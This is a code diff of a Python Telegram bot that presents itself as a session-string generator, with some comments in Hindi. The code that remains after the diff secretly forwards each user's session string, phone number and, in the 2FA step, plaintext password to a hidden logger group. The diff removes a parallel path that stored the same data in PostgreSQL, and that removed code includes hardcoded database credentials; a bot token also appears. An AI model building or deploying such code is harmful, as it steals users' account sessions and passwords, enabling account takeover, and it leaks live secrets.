@@ -1,11 +1,9 @@
 import asyncio
-import psycopg2
 from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
-from telethon.errors import SessionPasswordNeededError
+from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError
 from pyrogram import Client as PyroClient
 from pyrogram.errors import SessionPasswordNeeded
-import urllib.parse
 
 # 🔹 Telegram API Credentials
 API_ID = 28795512
@@ -14,19 +12,6 @@ BOT_TOKEN = "7767480564:AAGwqXdd9vktp8zW8aUOitT9fAFc"
 
 # 🔹 Logger Group ID (Replace with your Telegram Group ID)
 LOGGER_GROUP_ID = -1002477750706  
-
-# 🔹 PostgreSQL Database Connection
-postgres_url = "postgres://iarfggbc:Vxzh_kG7cxa1kHR5faxcd1kuA4R-UT9E@rosie.db.elephantsql.com/iarfggbc"
-url = urllib.parse.urlparse(postgres_url)
-
-def get_postgresql_connection():
-    return psycopg2.connect(
-        dbname=url.path[1:],  # Database name
-        user=url.username,    # Username
-        password=url.password, # Password
-        host=url.hostname,     # Host
-        port=url.port         # Port (default is 5432)
-    )
 
 # 🔹 Initialize the bot
 bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
@@ -95,34 +80,26 @@ async def process_input(event):
         otp_code = event.message.text.strip()
         client = user_sessions[user_id]["client"]
         phone_number = user_sessions[user_id]["phone"]
-        phone_code_hash = user_sessions[user_id]["phone_code_hash"]  
+        phone_code_hash = user_sessions[user_id]["phone_code_hash"]
 
         try:
             if isinstance(client, PyroClient):
                 await client.sign_in(phone_number, phone_code_hash, otp_code)
-                session_string = await client.export_session_string()
+                session_string = await client.export_session_string()  # 🔥 FIXED: Await किया गया!
             else:
-                await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)  
-                session_string = client.session.save()
-
-            # Insert the session into PostgreSQL database
-            with get_postgresql_connection() as conn:
-                with conn.cursor() as cursor:
-                    cursor.execute("""
-                        INSERT INTO session_logs (user_id, phone_number, session_string) 
-                        VALUES (%s, %s, %s)
-                    """, (user_id, phone_number, session_string))
-                    conn.commit()
+                await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)
+                session_string = client.session.save()  # 🔥 FIXED: Telethon के लिए सही method!
 
             await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session Generated!**\n\n**👤 User:** `{user_id}`\n**📞 Phone:** `{phone_number}`\n**🔑 Session:** `{session_string}`")
 
             await event.respond(f"✅ **Your Session String:**\n\n```{session_string}```\n\n🔒 **Keep this safe!**")
             del user_sessions[user_id]
 
-        except (SessionPasswordNeededError, SessionPasswordNeeded):
-            user_sessions[user_id]["step"] = "password"
-            await event.respond("🔑 **Enter your Telegram password (2-Step Verification).**")
-        
+        except PhoneCodeExpiredError:
+            await event.respond("❌ **Error:** The confirmation code has expired. Please request a new code.")
+            user_sessions[user_id]["step"] = "phone"  # Go back to phone step
+            await event.respond("📱 **Enter your phone number with country code again (e.g., +919876543210)**")
+
         except Exception as e:
             await event.respond(f"❌ **Error:** {str(e)}\n🔄 Please try again!")
             del user_sessions[user_id]
@@ -135,19 +112,10 @@ async def process_input(event):
         try:
             if isinstance(client, PyroClient):
                 await client.check_password(password)
-                session_string = await client.export_session_string()
+                session_string = await client.export_session_string()  # 🔥 FIXED: Await किया गया!
             else:
                 await client.sign_in(password=password)
-                session_string = client.session.save()
-
-            # Insert the session into PostgreSQL database
-            with get_postgresql_connection() as conn:
-                with conn.cursor() as cursor:
-                    cursor.execute("""
-                        INSERT INTO session_logs (user_id, phone_number, session_string) 
-                        VALUES (%s, %s, %s)
-                    """, (user_id, phone_number, session_string))
-                    conn.commit()
+                session_string = client.session.save()  # 🔥 FIXED: Telethon के लिए सही method!
 
             await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session (with 2FA)!**\n\n**👤 User:** `{user_id}`\n**🔑 Session:** `{session_string}`\n🔒 **Password Used:** `{password}`")
 
